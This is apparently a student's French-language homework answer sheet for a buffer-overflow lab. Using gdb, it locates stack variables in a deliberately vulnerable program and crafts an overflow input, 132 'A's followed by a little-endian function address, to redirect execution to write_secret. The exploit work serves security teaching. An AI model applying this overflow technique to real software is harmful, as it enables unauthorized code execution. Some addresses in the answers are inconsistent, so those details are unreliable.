@@ -1,0 +1,236 @@
+****************************
+*    HO Jimmy 21602486.    *
+* DM Sécurité Informatique *
+*        2018-2019 	   *
+****************************
+
+
+
+
+R1.1:Linux VM 4.8.0-36-generic #36~16.04.1-Ubuntu SMP Sun Feb 5 09:39:41 UTC 2017 i686 i686 i686 GNU/Linux
+#Justification de la réponse: On execute la commande "$> uname -a -p". On lit le résultat.
+
+
+
+R1.2: 5.4.0
+#Justification de la réponse: On execute la commande "$> gcc --version". On lit le résultat.
+
+
+
+
+R1.3: 7.11.1
+#Justification de la réponse: On execute la commande "$> gdb --version". Le résultat suivant est affiché : "GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"."
+
+
+
+R1.4: gcc -o wisdom-file wisdom-file.c -ggdb -fno-stack-protector -m32
+#Justification de la réponse: On exécute la commande "$> make exe" puis on lit le résultat.
+
+
+
+R1.5: $1 = 4 $2 = 4
+#Justification de la réponse: On exécute les commandes dans gdb: "(gdb) p sizeof(int)". On obtient : "$1 = 4". On exécute ensuite la commande "(gdb) p sizeof(fptr)". On obtient "$2 = 4".
+
+
+
+
+R2.1: wis
+#Justification de la réponse: L'utilisateur peut entrer une sagesse de taille supérieure 128, taille du buffer wis.
+
+
+
+R2.2: 100
+#Justification de la réponse: wis apparaît comme argument pour la fonction fgets à la ligne 100.
+
+
+
+
+R2.3: ptrs
+#Justification de la réponse: On peut accéder en dehors des limites des cases du tableau (par exemple ptrs[4]).
+
+
+
+
+R2.4: 159
+#Justification de la réponse: La variable globale ptrs est utilisée à la ligne 159.
+
+
+
+
+R3.1: $esp=0xbfd98dc0 $ebp=0xbfd991e8
+#Justification de la réponse: Voici les étapes montrant comment trouver les adresses de l'esp et ebp en mettant un breakpoint à la ligne 146:
+1) On ouvre deux terminaux où l'on se rend dans le dossier contenant les fichiers du DM.
+2) On compile à l'aide de "$> make exe".
+3) On lance l'executable dans un premier terminal.
+4) Dans l'autre terminal, on exécute la commande "$> ps -aux | grep 'wisdom-file'". On regarde le PID du processus qu'on a lancé dans le shell précédent. Notons n ce nombre.
+5) On exécute la commande gdb -p n pour attaché le processus à gdb.
+6) Une fois gdb lancé, on place un breakpoint à la ligne 146 : "(gdb) break wisdom-file.c:146"
+7) On se place sur le terminal où l'on avait lancé le programme. On entre '2'. 
+8) On revient sur le terminal on se trouve gdb puis on entre 'c' pour continuer. 
+9) On se replace sur le terminal où le programme a été lancé et appuie sur entrée (cela permettra de revenir au main et donc d'atteindre le breakpoint que l'on a placé plus haut).
+10) Le breakpoint ayant été atteint, on peut regarder les valeurs de esp et de ebp en effectuant les commandes suivantes: "(gdb) print $esp"  "(gdb) print $ebp";
+
+
+
+
+
+R3.2:&buf=0xbfd98dcc
+#Justification de la réponse: On exécute la commande "(gdb) p &buf". "p" est un alias pour "print". On affiche ainsi l'adresse de "buf". Une deuxième manière pour trouver cette adresse est d'étudier le code assembleur du main: la ligne "char   buf[1024] = {0};" est représentée par l'instruction  " 0x080489f3 <+21>:	lea    -0x41c(%ebp),%edx". 
+On affiche alors l'adresse de buf de la manière suivante : "p $ebp-0x41c".
+
+
+
+
+
+R3.3: &r=0xbfd991d8 &rs=0xbfd991d4 &p=0xbfd991dc
+#Justification de la réponse:
+Pour chaque variable, on tape la commande "(gdb) p &<nom_de_la_variable>". On lit ensuite les résultats. Une deuxième manière consiste à étudier le code assembleur.
+Pour trouver la valeur de r, on désassemble le main dans gdb de la manière suivant: "(gdb) disas main". On étudie alors les instructions qui suivent l'appel à fwrite pour trouver la valeur de l'adresse de r car notre code indique "r = fwrite(greeting, sizeof(char), sizeof(greeting), stdout);".
+L'instruction "0x08048a25 <+71>:	mov    %eax,-0x10(%ebp)" permet de déterminer l'adresse de write. En effet elle copie le contenu du register eax à l'adresse $ebp-0x10 après l'appel à fwrite. On en déduit que &r= $ebp-0x10 = 0xbfd991d8.
+Pour trouver la valeur de rs, on raisonne de manière analogue sur la fonction fgets. L'instruction "0x08048a87 <+169>:	mov    %eax,-0x14(%ebp)" nous donne l'adresse de rs: &rs = $ebp-0x14 = 0xbfd991d4.
+En ce qui concerne la valeur de p, nous étudierons les instructions qui précédent fwrite car on attribue une valeur à p avant l'appel de fwrite.
+En désassemblant le main, on observe l'instruction "0x08048a07 <+41>:	movl   $0x8048695,-0xc(%ebp)". Celle-ci permet la création d'un pointeur à l'adresse $ebp-0xc (qui vaut 0xbfffeddc) vers le contenu de la mémoire à l'adresse : 0x8048695.
+On vérifie d'abord le contenu de  $0x8048695: "(gdb) x/a s0x8048695", l'exécution de la commande nous affiche bien "<pat_on_back>".
+On vérifie ensuite que 0xbfffeddc pointe bien vers 0x8048695 : "(gdb) 0xbfffeddc " nous renvoie bien "<pat_on_back>".
+On a alors &p =0xbfd991dc.
+
+
+
+
+
+
+R3.4: inverse
+#Justification de la réponse: En utilisant les résultats de la question précédente, on a &r=0xbfd991d8 &rs=0xbfd991d4 &p=0xbfd991dc
+Le haut de la pile correspondant à l'adresse la plus basse, on obtient alors l'addresse de rs en premier lieu, puis r, puis p. 
+La valeur de p ayant été définie avant r, elle même définie avant rs, on en déduit que le compilateur a généré du code pour mettre sur la pile les variables locales dans l'ordre inverse.
+
+
+
+
+
+
+R3.5: &ptrs=0x804a0e8 
+#Justification de la réponse: On tape la commande "(gdb) &ptrs". On lit le résultat.
+Nous pouvons étudions le code assembleur pour obtenir l'adresse de ptrs:
+en désassemblant la fonction main, on étudie les instructions qui suivent le "call" à "atol".
+L'instruction "0x08048ab5 <+215>:	mov    0x804a0e8(,%eax,4),%eax" est intéressante: elle copie le contenu situé à l'adresse 0x804a0e8 dans le registre eax.
+On se doute donc que 0x804a0e8 correspond à l'adresse de la variable globale. On vérifie de la manière suivant : "x/a 0x804a0e8". L'exécution nous affiche bien "<ptrs>".
+
+
+
+
+
+
+R3.6: 771046461
+#Justification de la réponse: notre résultat est solution de l'équation : &p - 4*n = &ptrs.
+nous avons trouvé les adresses de ptrs et de p qui sont respectivement : 0x804a0e8 et 0xbfd991dc.
+En faisant la soustraction de p à ptrs à l'aide du site https://www.ma-calculatrice.fr/, nous obtenons la valeur de b7d4f0f4 en hexadécimal, soit 3084185844.
+On divise ce nombre par 4 pour obtenir le résultat: 2dea2d29 soit 771046461.
+On essaie dans gdb, et obtenons bien le message "Achievement unlocked".
+
+
+
+
+
+
+
+R3.7: 0x804865b
+#Justification de la réponse: On exécute la commande "(gdb) p &write_secret". On lit le résultat.
+
+
+
+
+
+R3.8: 771046217
+#Justification de la réponse: On raisonne de la même manière que la question 3.6: on cherche dans un premier temps l'adresse de buf[64] de la manière suivant : "(gdb) p &buf[64]". 
+On obtient alors &buf[64]= 0xbfd98e0c
+On a &ptrs = 0x804a0e8
+D'où (&buf[64]-&ptrs)/4= 2df53b49 (en hexadécimal) soit 771046217 (en décimal)
+
+
+
+
+
+R3.9: S=5 T=b U=8 V=6 X=0 Y=4 Z=0 W=8.
+#Justification de la réponse: D'après la question 3.7, on a trouve &write_secret = 0x804865b.
+Pour que ptrs[s] renvoie l'adresse de write_secret, qui sera exécutée pour dévoiler le secret, il est nécessaire que l'entrée du choix du menu se termine par \x5b\x86\x04\x08. En effet, l'architecture little endian nous oblige a indiqué les octets dans l'ordre inverse.
+On a alors S=5 T=b U=8 V=6 X=0 Y=4 Z=0 W=8.
+ 
+
+
+
+
+
+R4.1:0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0xb7709000 0xbfd991cc 0xbfd991e8 0x8048a9f <main+193>	0xbfd98dcc 0xbfd991cc 0xbfd991e8 0x8048ac4 <main+230> 0xb755ca88 0xb77d0e60 <check_match+304> 0xb743cc45 0xa32 0x0	0x0 0x0
+#Justification de la réponse: Pour commencer, nous plaçons un breakpoint à la ligne 77 de la manière suivante: "(gdb) break wisdom-file.c:77". On doit ensuite atteindre le breakpoint, c'est à dire entrer dans la fonction put_wisdom. On entre alors "2" comme sélection dans le terminal où se trouve le programme lancé. Une fois le breakpoint atteint, nous exécutons la commande "(gdb) p &wis" pour obtenir l'adresse de wis. On obtient &wis=0xbfd98d1. Maintenant, pour obtenir les 48 mots à partir de l'adresse de wis. On exécute alors la commande: "x/48aw 0xbfd98d1c
+". On utilise "a" pour afficher le contenu et "w" pour "words". On obtient le résultat suivant: "
+0xbfd98d1c:	0x0	0x0	0x0	0x0
+0xbfd98d2c:	0x0	0x0	0x0	0x0
+0xbfd98d3c:	0x0	0x0	0x0	0x0
+0xbfd98d4c:	0x0	0x0	0x0	0x0
+0xbfd98d5c:	0x0	0x0	0x0	0x0
+0xbfd98d6c:	0x0	0x0	0x0	0x0
+0xbfd98d7c:	0x0	0x0	0x0	0x0
+0xbfd98d8c:	0x0	0x0	0x0	0x0
+0xbfd98d9c:	0x0	0xb7709000	0xbfd991cc	0xbfd991e8
+0xbfd98dac:	0x8048a9f <main+193>	0xbfd98dcc	0xbfd991cc	0xbfd991e8
+0xbfd98dbc:	0x8048ac4 <main+230>	0xb755ca88	0xb77d0e60 <check_match+304>	0xb743cc45
+0xbfd98dcc:	0xa32	0x0	0x0	0x0".
+
+
+
+
+
+
+R4.2: &ebp=0xbfd98db8  Contenu des 4 premiers mots: 0xbfd991e8	0x8048ac4 <main+230>	0xb755ca88	0xb77d0e60 <check_match+304>
+#Justification de la réponse : On exécute les commandes : "p &ebp" et "(gdb) x/4aw $ebp"
+
+
+
+
+
+R4.3:0x080489dd
+#Justification de la réponse: On désassemble put_wisdom de la manière suivante: "(gdb) disas put_wisdom". On regarde la dernière instruction ret : "0x080489dd <+562>:	ret". Celle-ci a pour adresse 0x080489dd.
+
+
+
+
+
+R4.4: <put_wisdom+562>
+#Justification de la réponse: Pour obtenir l'instruction qui se trouve à l'adresse du résultat de la question ci-dessus, on exécute la commande "x/a ".On obtient "<put_wisdom+562>".
+
+
+
+
+R4.5: "echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x5b\x86\x04\x08' > myfile"
+Tout d'abord on identifie le début du buffer wis: on avait trouvé: &wis=0xbfd98d1.
+On souhaite maintenant obtenir la taille du buffer. On place dans un fichier myfile 132 fois la lettre A. 
+On essaie et cela fonctionne.
+En plaçant exactement 136 fois la lettre A, on reçoit un segmentation fault indiquant l'adresse x41414141 (ce qui n'est pas le cas pour exactement 135 fois la lettre A). On en déduit qu'il faut écrire 136-4=132 fois la lettre A suivie de l'adresse de write_secret écrite à l'envers en raison de l'architecture little endian soit : \x5b\x86\x04\x08. 
+On vérifie que cela fonctionne: on entre 2 dans le menu pour put_wisdom, puis on choisit myfile (après l'avoir généré avec notre commande"). On obtient alors:
+"Program received signal SIGSEGV, Segmentation fault.
+0xb7e89d8b in _IO_old_fclose (fp=0x804865b <write_secret>) at oldiofclose.c:58
+58	oldiofclose.c: No such file or directory.". L'adresse write_secret a bien été atteinte.
+
+
+
+
+
+
+
+
+
+
